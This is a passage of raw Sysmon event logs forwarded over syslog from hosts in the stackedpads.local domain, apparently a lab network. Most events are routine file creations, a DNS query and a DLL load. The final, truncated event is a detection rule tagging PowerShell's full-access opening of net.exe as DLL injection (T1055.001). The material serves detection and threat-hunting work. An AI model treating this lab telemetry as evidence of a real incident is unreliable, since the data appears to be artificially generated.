<14>Jul  8 13:42:29 activedir.stackedpads.local Microsoft-Windows-Sysmon[3224]: {"EventTime":1657287747,"Hostname":"activedir.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":278381,"ProcessID":3224,"ThreadID":4128,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:27.703\r\nProcessGuid: {3be6fa21-31d0-62c8-4a00-000000001100}\r\nProcessId: 812\r\nImage: C:\\Windows\\system32\\DFSRs.exe\r\nTargetFilename: C:\\System Volume Information\\DFSR\\Config\\Volume_31F91E61-3D12-4512-996A-A18A5DC0DBEC.XML.TMP\r\nCreationUtcTime: 2022-07-08 13:42:27.703\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:27.703","ProcessGuid":"{3be6fa21-31d0-62c8-4a00-000000001100}","Image":"C:\\Windows\\system32\\DFSRs.exe","TargetFilename":"C:\\System Volume Information\\DFSR\\Config\\Volume_31F91E61-3D12-4512-996A-A18A5DC0DBEC.XML.TMP","CreationUtcTime":"2022-07-08 13:42:27.703","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287749,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:29 activedir.stackedpads.local Microsoft-Windows-Sysmon[3224]: {"EventTime":1657287747,"Hostname":"activedir.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":278376,"ProcessID":3224,"ThreadID":4128,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:27.703\r\nProcessGuid: {3be6fa21-31d0-62c8-4a00-000000001100}\r\nProcessId: 812\r\nImage: C:\\Windows\\system32\\DFSRs.exe\r\nTargetFilename: C:\\System Volume Information\\DFSR\\Config\\Replica_A9602E73-B222-4385-BF91-B9AA652956A4.XML.TMP\r\nCreationUtcTime: 2022-07-08 13:42:27.703\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:27.703","ProcessGuid":"{3be6fa21-31d0-62c8-4a00-000000001100}","Image":"C:\\Windows\\system32\\DFSRs.exe","TargetFilename":"C:\\System Volume Information\\DFSR\\Config\\Replica_A9602E73-B222-4385-BF91-B9AA652956A4.XML.TMP","CreationUtcTime":"2022-07-08 13:42:27.703","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287749,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:29 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287747,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72920,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:27.933\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\DLLHOST.EXE-FAAC3479.pf\r\nCreationUtcTime: 2022-07-07 12:35:41.145\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:27.933","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\DLLHOST.EXE-FAAC3479.pf","CreationUtcTime":"2022-07-07 12:35:41.145","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287749,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:29 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287748,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72921,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:28.636\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\SMARTSCREEN.EXE-EACC1250.pf\r\nCreationUtcTime: 2022-06-22 16:03:56.708\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:28.636","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\SMARTSCREEN.EXE-EACC1250.pf","CreationUtcTime":"2022-06-22 16:03:56.708","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287749,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:29 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287748,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72922,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:28.933\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\SECURITYHEALTHSYSTRAY.EXE-E527A4AE.pf\r\nCreationUtcTime: 2022-06-22 16:11:24.311\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:28.933","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\SECURITYHEALTHSYSTRAY.EXE-E527A4AE.pf","CreationUtcTime":"2022-06-22 16:11:24.311","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287749,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:32 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287750,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":7,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":7,"OpcodeValue":0,"RecordNumber":72923,"ProcessID":2568,"ThreadID":3316,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:30.355\r\nProcessGuid: {6b7cbb53-3446-62c8-f500-000000000e00}\r\nProcessId: 6648\r\nImage: C:\\Windows\\System32\\taskhostw.exe\r\nImageLoaded: C:\\Windows\\System32\\urlmon.dll\r\nFileVersion: 11.00.19041.1741 (WinBuild.160101.0800)\r\nDescription: OLE32 Extensions for Win32\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: UrlMon.dll\r\nHashes: SHA1=5E1037110EB5C33288F8EA24EBDD3BD0532A279E,MD5=E76C30B53C58F02694CAC858089709D1,SHA256=72498FBEEA86C2E5B5DC15775D41AC607EF63E2B41B8A91CF6B602024B313FE3,IMPHASH=F1542B5592621C50A426D247782724CB\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: STACKEDPADS\\tim.smith","Category":"Image loaded (rule: ImageLoad)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:30.355","ProcessGuid":"{6b7cbb53-3446-62c8-f500-000000000e00}","Image":"C:\\Windows\\System32\\taskhostw.exe","ImageLoaded":"C:\\Windows\\System32\\urlmon.dll","FileVersion":"11.00.19041.1741 (WinBuild.160101.0800)","Description":"OLE32 Extensions for Win32","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"UrlMon.dll","Hashes":"SHA1=5E1037110EB5C33288F8EA24EBDD3BD0532A279E,MD5=E76C30B53C58F02694CAC858089709D1,SHA256=72498FBEEA86C2E5B5DC15775D41AC607EF63E2B41B8A91CF6B602024B313FE3,IMPHASH=F1542B5592621C50A426D247782724CB","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287752,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:34 activedir.stackedpads.local Microsoft-Windows-Sysmon[3224]: {"EventTime":1657287752,"Hostname":"activedir.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":22,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":22,"OpcodeValue":0,"RecordNumber":278384,"ProcessID":3224,"ThreadID":4252,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Dns query:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:30.771\r\nProcessGuid: {3be6fa21-31c6-62c8-1500-000000001100}\r\nProcessId: 8\r\nQueryName: activedir.stackedpads.local\r\nQueryStatus: 0\r\nQueryResults: fe80::5489:1501:58fa:5feb;::ffff:10.1.0.4;\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nUser: NT AUTHORITY\\LOCAL SERVICE","Category":"Dns query (rule: DnsQuery)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:30.771","ProcessGuid":"{3be6fa21-31c6-62c8-1500-000000001100}","QueryName":"activedir.stackedpads.local","QueryStatus":"0","QueryResults":"fe80::5489:1501:58fa:5feb;::ffff:10.1.0.4;","Image":"C:\\Windows\\System32\\svchost.exe","User":"NT AUTHORITY\\LOCAL SERVICE","EventReceivedTime":1657287754,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:32 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287750,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72924,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:30.965\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\WLRMDR.EXE-A7C36FDD.pf\r\nCreationUtcTime: 2022-06-22 16:09:40.787\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:30.965","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\WLRMDR.EXE-A7C36FDD.pf","CreationUtcTime":"2022-06-22 16:09:40.787","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287752,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:33 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287752,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72926,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:32.028\r\nProcessGuid: {6b7cbb53-343b-62c8-f100-000000000e00}\r\nProcessId: 6516\r\nImage: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\r\nTargetFilename: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings.ini\r\nCreationUtcTime: 2022-07-07 19:19:29.015\r\nUser: STACKEDPADS\\tim.smith","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:32.028","ProcessGuid":"{6b7cbb53-343b-62c8-f100-000000000e00}","Image":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","TargetFilename":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings.ini","CreationUtcTime":"2022-07-07 19:19:29.015","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287753,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:33 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287752,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72925,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:32.028\r\nProcessGuid: {6b7cbb53-343b-62c8-f100-000000000e00}\r\nProcessId: 6516\r\nImage: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\r\nTargetFilename: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings_temp.ini\r\nCreationUtcTime: 2022-07-07 19:19:29.015\r\nUser: STACKEDPADS\\tim.smith","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:32.028","ProcessGuid":"{6b7cbb53-343b-62c8-f100-000000000e00}","Image":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","TargetFilename":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings_temp.ini","CreationUtcTime":"2022-07-07 19:19:29.015","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287753,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:33 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287752,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72927,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:32.043\r\nProcessGuid: {6b7cbb53-343b-62c8-f100-000000000e00}\r\nProcessId: 6516\r\nImage: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\r\nTargetFilename: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\SyncEngine-2022-07-08.1333.6160.1.odlgz\r\nCreationUtcTime: 2022-07-08 13:42:32.043\r\nUser: STACKEDPADS\\tim.smith","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:32.043","ProcessGuid":"{6b7cbb53-343b-62c8-f100-000000000e00}","Image":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","TargetFilename":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\SyncEngine-2022-07-08.1333.6160.1.odlgz","CreationUtcTime":"2022-07-08 13:42:32.043","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287753,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:33 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287752,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72928,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:32.153\r\nProcessGuid: {6b7cbb53-343b-62c8-f100-000000000e00}\r\nProcessId: 6516\r\nImage: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\r\nTargetFilename: C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\Update_2022-07-08_134221_6516-5504.loggz\r\nCreationUtcTime: 2022-07-08 13:42:32.153\r\nUser: STACKEDPADS\\tim.smith","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:32.153","ProcessGuid":"{6b7cbb53-343b-62c8-f100-000000000e00}","Image":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","TargetFilename":"C:\\Users\\tim.smith\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\Update_2022-07-08_134221_6516-5504.loggz","CreationUtcTime":"2022-07-08 13:42:32.153","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287753,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:33 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287752,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72929,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:32.730\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\AUDIODG.EXE-AB22E9A6.pf\r\nCreationUtcTime: 2022-06-23 19:57:34.949\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:32.730","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\AUDIODG.EXE-AB22E9A6.pf","CreationUtcTime":"2022-06-23 19:57:34.949","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287753,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72930,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:34.215\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\POWERSHELL.EXE-CA1AE517.pf\r\nCreationUtcTime: 2022-07-07 19:19:14.125\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:34.215","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\POWERSHELL.EXE-CA1AE517.pf","CreationUtcTime":"2022-07-07 19:19:14.125","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287755,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72931,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:34.277\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\CONHOST.EXE-0C6456FB.pf\r\nCreationUtcTime: 2022-06-23 19:54:50.745\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:34.277","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\CONHOST.EXE-0C6456FB.pf","CreationUtcTime":"2022-06-23 19:54:50.745","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287755,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":72934,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-07-08 13:42:34.888\r\nProcessGuid: {6b7cbb53-316d-62c8-1500-000000000e00}\r\nProcessId: 712\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\NET.EXE-A0964F30.pf\r\nCreationUtcTime: 2022-07-07 19:19:38.421\r\nUser: NT AUTHORITY\\SYSTEM","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2022-07-08 13:42:34.888","ProcessGuid":"{6b7cbb53-316d-62c8-1500-000000000e00}","Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\NET.EXE-A0964F30.pf","CreationUtcTime":"2022-07-07 19:19:38.421","User":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1657287755,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":10,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":10,"OpcodeValue":0,"RecordNumber":72933,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process accessed:\r\nRuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection\r\nUtcTime: 2022-07-08 13:42:34.777\r\nSourceProcessGUID: {6b7cbb53-343f-62c8-f300-000000000e00}\r\nSourceProcessId: 2744\r\nSourceThreadId: 6748\r\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetProcessGUID: {6b7cbb53-344a-62c8-f700-000000000e00}\r\nTargetProcessId: 4820\r\nTargetImage: C:\\Windows\\system32\\net.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9e634|C:\\Windows\\System32\\KERNELBASE.dll+8e73|C:\\Windows\\System32\\KERNELBASE.dll+71a6|C:\\Windows\\System32\\KERNEL32.DLL+1cbb4|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+111e1f9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10753ba|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ffaad|C:\\Windows\\assembly\\NativeImages_v4.0.30319_6